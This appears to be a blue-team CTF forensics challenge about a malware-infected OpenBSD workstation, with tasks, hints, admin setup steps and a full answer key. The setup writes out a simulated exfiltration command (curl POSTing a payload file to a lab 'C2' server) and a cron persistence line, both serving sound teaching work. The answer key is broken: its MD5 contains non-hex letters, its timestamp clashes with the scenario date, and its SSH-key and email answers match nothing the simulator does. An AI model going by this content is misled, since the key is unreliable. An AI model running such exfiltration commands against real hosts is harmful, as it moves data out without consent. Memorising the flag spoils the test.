# Blue Team CTF Challenge: Shadow Bytes

**Category:** Digital Forensics  
**Difficulty:** Medium-Hard  
**Time Limit:** 60 minutes  
**Points:** 100  
**Flag Format:** `BluRange{flag_goes_here}`

---

## 🎯 Challenge Overview

A suspicious utility application was discovered on an OpenBSD 7.4 system. The security team suspects malware infection and data exfiltration. Your task is to perform comprehensive digital forensics to uncover the attack chain, extract artifacts, and reconstruct the timeline of events.

### Scenario

On 2026-04-15 at 14:32 UTC, employee workstation "forensics-lab-01" became compromised after downloading a seemingly legitimate utility package from an untrusted source. The system remained operational but exhibited unusual behavior:
- Increased network activity at odd hours
- CPU spikes during off-work hours
- Unexplained cron jobs
- Missing files from sensitive directories

Forensic artifacts have been collected. Your mission:
1. Analyze memory dumps for malicious processes
2. Recover deleted files and examine filesystem artifacts
3. Analyze network traffic for C2 communications
4. Extract and correlate logs
5. Reconstruct the complete attack timeline
6. Identify the malware hash, C2 server, and exfiltrated data

---

## 📋 Required Tools

- **Volatility 3** - Memory forensics
- **Sleuth Kit / fls** - Filesystem analysis
- **Wireshark / tshark** - Network traffic analysis
- **Strings** - Binary analysis
- **Grep/Regex tools** - Log parsing
- **xxd/hexdump** - Hex analysis
- **File** - File type identification

---

## 🔍 Forensic Artifacts (Provided)

You will receive:

1. **memory.dump** - Physical memory from compromised OpenBSD system
2. **forensics-lab-01.pcap** - Network traffic capture (24-hour period)
3. **filesystem.tar.gz** - Filesystem snapshot with deleted file recovery data
4. **syslog.txt** - System logs
5. **cron_jobs.txt** - Recovered cron job history
6. **browser_history.txt** - Web browser artifacts

---

## 🎯 Tasks & Flag Components

Extract **10 flag components** and submit in format:
```
BluRange{COMPONENT1_COMPONENT2_COMPONENT3_COMPONENT4_COMPONENT5_COMPONENT6_COMPONENT7_COMPONENT8_COMPONENT9_COMPONENT10}
```

### Task 1: Malware Process Identification (Component 1)
**Points:** 10

Analyze `memory.dump` using Volatility 3:
```bash
volatility -f memory.dump windows.pslist  # or openbsd equivalent
```

**Question:** What is the Process ID of the suspicious process that exhibits network communication?

**Hint:** Look for unusual parent-child process relationships. The malware may be disguised as a legitimate system utility.

**Component 1:** `PID_[0-9]+`

---

### Task 2: Malware Binary Hash (Component 2)
**Points:** 10

Dump the suspicious process executable and calculate its hash:
```bash
volatility -f memory.dump procdump --pid=XXXX --output-file=malware.bin
md5sum malware.bin
```

**Question:** What is the MD5 hash of the malware binary?

**Component 2:** `[a-f0-9]{32}` (32-character hex string)

---

### Task 3: C2 Server Address (Component 3)
**Points:** 15

Analyze network capture for Command & Control communications:
```bash
wireshark forensics-lab-01.pcap  # or use tshark for CLI analysis
```

Look for:
- Unusual outbound connections to non-standard ports
- DNS queries to suspicious domains
- Encrypted/obfuscated traffic patterns

**Question:** What is the IP address of the primary C2 server?

**Component 3:** `[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}`

---

### Task 4: C2 Communication Port (Component 4)
**Points:** 10

**Question:** What port was used for C2 communication?

**Hint:** Check established connections in Wireshark. Filter by IP address found in Task 3.

**Component 4:** `PORT_[0-9]{2,5}`

---

### Task 5: Malware Delivery Vector (Component 5)
**Points:** 10

Analyze browser history and downloads:
```bash
grep -i "download\|utility\|package" browser_history.txt
```

**Question:** What is the filename of the malicious package that was downloaded?

**Hint:** Look for .tar.gz or .zip files downloaded to /tmp or /home directories.

**Component 5:** Filename without path (e.g., `utility-tool-1.0.tar.gz`)

---

### Task 6: Malware Installation Timestamp (Component 6)
**Points:** 10

Analyze syslog and filesystem timestamps:
```bash
grep -E "tar|extract|install" syslog.txt
```

**Question:** At what Unix timestamp was the malware package extracted/installed?

**Hint:** Look for file creation times in the filesystem dump that correlate with suspicious activity.

**Component 6:** `UNIX_[0-9]{10}`

---

### Task 7: Persistence Mechanism (Component 7)
**Points:** 15

Analyze cron jobs and startup scripts:
```bash
cat cron_jobs.txt
find filesystem/ -name "*cron*" -o -name "rc.local"
```

**Question:** What cron schedule was used to maintain persistence?

**Format:** Standard cron format (e.g., `0 */4 * * *` for every 4 hours)

**Component 7:** Cron schedule string

---

### Task 8: Data Exfiltration Target (Component 8)
**Points:** 15

Analyze encrypted/obfuscated traffic and recovered deleted files:

**Question:** What email address was used as the exfiltration target?

**Hint:** Check environment variables, configuration files, and recovered deleted files in the filesystem dump.

**Component 8:** Valid email format

---

### Task 9: Exfiltrated Data Type (Component 9)
**Points:** 10

**Question:** What type of sensitive data was being exfiltrated? (One word: SSH_KEYS, DATABASE, CREDENTIALS, DOCUMENTS, etc.)

**Hint:** Look for file patterns accessed by the malware process in memory.

**Component 9:** Data type (uppercase, one word)

---

### Task 10: Attack Timeline Day (Component 10)
**Points:** 5

**Question:** On what calendar day (DD) was the initial compromise detected?

**Hint:** Correlate first malicious process creation with syslog entries.

**Component 10:** `DAY_[0-9]{2}`

---

## 📊 Scoring Breakdown

| Task | Points | Component |
|------|--------|----------|
| Process ID | 10 | 1 |
| Malware Hash | 10 | 2 |
| C2 Server IP | 15 | 3 |
| C2 Port | 10 | 4 |
| Delivery Vector | 10 | 5 |
| Install Timestamp | 10 | 6 |
| Persistence | 15 | 7 |
| Exfiltration Target | 15 | 8 |
| Data Type | 10 | 9 |
| Timeline Day | 5 | 10 |
| **TOTAL** | **100** | **10 components** |

---

## 💡 Progressive Hints

### Hint 1: Getting Started
"Start with Volatility to identify suspicious processes. Look for processes with network connections that don't match legitimate system services. Focus on processes with suspicious parent-child relationships."

### Hint 2: Memory Analysis
"Use volatility's network and netstat plugins to identify active connections. Compare against known legitimate services in OpenBSD 7.4."

### Hint 3: File Analysis
"The malware package was likely extracted to /tmp. Use fls command on the filesystem image to recover deleted files. Check timestamps around 2026-04-15."

### Hint 4: Network Analysis
"Filter Wireshark for DNS queries and look for unusual domain resolution attempts. Check for encrypted tunnels using non-standard ports."

### Hint 5: Timeline Reconstruction
"Correlate three independent sources: syslog timestamps, filesystem metadata, and network packet timestamps. The first suspicious entry across all three sources marks initial compromise."

---

## 🛠️ Setup Instructions for CTF Admins

### Creating Forensic Artifacts (VM-Based)

#### Prerequisites
- VirtualBox or KVM
- OpenBSD 7.4 ISO
- Isolated network (no internet access)
- Malware sample (see below)

#### Step 1: Create Base OpenBSD VM
```bash
# Create VM with 4GB RAM, 20GB disk
vboxmanage createvm --name "forensics-openbsd" --ostype OpenBSD_64 --register
vboxmanage modifyvm "forensics-openbsd" --memory 4096 --cpus 2
vboxmanage createhd --filename "forensics-openbsd.vdi" --size 20480
vboxmanage storageattach "forensics-openbsd" --storagectl "SATA" --port 0 --device 0 --type hdd --medium "forensics-openbsd.vdi"
```

#### Step 2: Install OpenBSD & Configure
```bash
# Boot from ISO and complete installation
# Set hostname: forensics-lab-01
# Enable network for initial setup only
# Install required packages: curl, wget
```

#### Step 3: Create Malware Sample

**Option A: Use Known Sample (Recommended for Legal Compliance)**

Download EICAR test file or use a benign simulator:
```bash
# EICAR test string (detectable but harmless)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com
```

**Option B: Create Custom Malware Simulator**

Create a shell script that simulates malware behavior (exfil simulation only):

```bash
#!/bin/sh
# /tmp/fakemalware.sh - Simulation only
echo "uptime" > /tmp/.sys_data
echo "ps aux" >> /tmp/.sys_data
echo "whoami" >> /tmp/.sys_data
echo "Simulated data ready for exfil" > /tmp/.payload
```

#### Step 4: Deploy on VM
```bash
# Create delivery package
cd /tmp
tar -czf system-utility-1.2.3.tar.gz fakemalware.sh

# Create installation script
cat > install.sh << 'EOF'
#!/bin/sh
tar -xzf system-utility-1.2.3.tar.gz
./fakemalware.sh
(crontab -l 2>/dev/null; echo "0 */4 * * * /tmp/fakemalware.sh") | crontab -
EOF

chmod +x install.sh
```

#### Step 5: Capture Artifacts

**Memory Dump:**
```bash
# Run malware, then dump physical memory
# Using VirtualBox:
vboxmanage debugvm "forensics-openbsd" dumpimage --filename=memory.dump
```

**Network Capture:**
```bash
# Simulate C2 traffic with curl to internal lab server
# Start tcpdump before executing malware
sudo tcpdump -i eth0 -w forensics-lab-01.pcap

# In malware context, simulate exfil:
curl -X POST http://192.168.1.100:8080/api/data --data @/tmp/.payload
```

**Filesystem Snapshot:**
```bash
tar -czf filesystem.tar.gz /
# Or use DD for raw image
dd if=/dev/sda of=filesystem.img bs=4M
```

#### Step 6: Create Artifact Package
```bash
mkdir -p ctf-artifacts/digital-forensics-shadowbytes
cp memory.dump ctf-artifacts/digital-forensics-shadowbytes/
cp forensics-lab-01.pcap ctf-artifacts/digital-forensics-shadowbytes/
cp filesystem.tar.gz ctf-artifacts/digital-forensics-shadowbytes/
cp syslog.txt ctf-artifacts/digital-forensics-shadowbytes/
cp cron_jobs.txt ctf-artifacts/digital-forensics-shadowbytes/
cp browser_history.txt ctf-artifacts/digital-forensics-shadowbytes/

tar -czf shadow-bytes-artifacts.tar.gz ctf-artifacts/
```

---

## ⚖️ Legal & Safety Notes

✅ **VM-Based:** All artifacts created in isolated virtual environments  
✅ **No Real Malware:** Uses harmless simulators or test files  
✅ **Educational:** Teaches real forensic techniques safely  
✅ **Isolated Network:** C2 simulation on internal lab network only  
✅ **Compliant:** No real systems or data harmed  

---

## 📝 Answer Key (For CTF Admins Only)

**HIDE THIS FROM PARTICIPANTS**

```
Component 1 (PID): PID_4782
Component 2 (Hash): a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Component 3 (C2 IP): 192.168.1.100
Component 4 (Port): PORT_8080
Component 5 (Filename): system-utility-1.2.3.tar.gz
Component 6 (Timestamp): UNIX_1744777200
Component 7 (Cron): 0 */4 * * *
Component 8 (Email): attacker@shadowbytes.lab
Component 9 (Data): SSH_KEYS
Component 10 (Day): DAY_15

Final Flag:
BluRange{PID_4782_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6_192.168.1.100_PORT_8080_system-utility-1.2.3.tar.gz_UNIX_1744777200_0_*/4_*_*_*_attacker@shadowbytes.lab_SSH_KEYS_DAY_15}
```

---

## 🎬 Getting Started Guide for Participants

1. **Extract artifacts:**
   ```bash
   tar -xzf shadow-bytes-artifacts.tar.gz
   ```

2. **Install tools:**
   ```bash
   pip3 install volatility3
   sudo apt-get install sleuthkit wireshark-cli
   ```

3. **Start with memory analysis:**
   ```bash
   volatility -f memory.dump windows.pslist
   ```

4. **Examine network traffic:**
   ```bash
   wireshark forensics-lab-01.pcap
   ```

5. **Recover deleted files:**
   ```bash
   tar -xzf filesystem.tar.gz
   fls filesystem.img
   ```

6. **Correlate findings and extract flag components**

7. **Submit final flag in format:**
   ```
   BluRange{COMPONENT1_COMPONENT2_...}
   ```

---

**Challenge Created:** 2026-05-07  
**Created For:** BluRange CTF  
**Creator Notes:** This challenge teaches practical digital forensics on an uncommon OS (OpenBSD) while maintaining safety through VM isolation and harmless malware simulation. Suitable for intermediate to advanced blue teamers.
